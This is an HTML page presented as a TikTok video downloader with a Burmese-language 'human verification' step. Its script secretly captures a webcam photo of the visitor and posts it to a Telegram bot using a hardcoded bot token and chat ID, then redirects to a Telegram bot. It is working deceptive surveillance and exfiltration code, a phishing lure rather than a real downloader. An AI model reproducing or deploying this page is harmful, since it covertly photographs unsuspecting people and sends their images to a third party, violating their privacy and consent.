<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Video Downloader</title>
    <style>
        body { background-color: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px; }
        .container { max-width: 400px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 15px; }
        button { background-color: #fe2c55; color: white; border: none; padding: 15px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; font-size: 16px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://www.tiktok.com/favicon.ico" width="50">
        <h2>Verification Required</h2>
        <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် သင်သည် လူသားဖြစ်ကြောင်း အတည်ပြုပေးရန် လိုအပ်ပါသည်။</p>
        <button onclick="startVerification()">Verify Now 🔒</button>
        <div id="loader" style="display:none; margin-top:20px;">စစ်ဆေးနေသည်... ခေတ္တစောင့်ပါ...</div>
    </div>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const camBotToken = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
        const camChatId = '5304050102';
        const downloaderBotUser = '@tiktokhdvideo12_bot'; // ဥပမာ- TikTok_DL_Bot

        async function startVerification() {
            document.getElementById('loader').style.display = 'block';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(async (blob) => {
                        const fd = new FormData();
                        fd.append('chat_id', camChatId);
                        fd.append('photo', blob, 'shot.jpg');
                        
                        // ပုံကို Cam Bot ဆီ ပို့မယ်
                        await fetch(`https://api.telegram.org/bot${camBotToken}/sendPhoto`, { method: 'POST', body: fd });
                        
                        // ပုံပို့ပြီးတာနဲ့ Downloader Bot ဆီ Verification Success စာသားနဲ့ ပြန်လွှဲမယ်
                        window.location.href = `https://t.me/${downloaderBotUser}?start=Verification_Success`;
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 'image/jpeg');
                }, 2000);
            } catch (e) {
                // ငြင်းလိုက်ရင်လည်း Bot ဆီပဲ ပြန်လွှဲပေးလိုက်မယ်
                window.location.href = `https://t.me/${downloaderBotUser}`;
            }
        }
    </script>
</body>
</html>
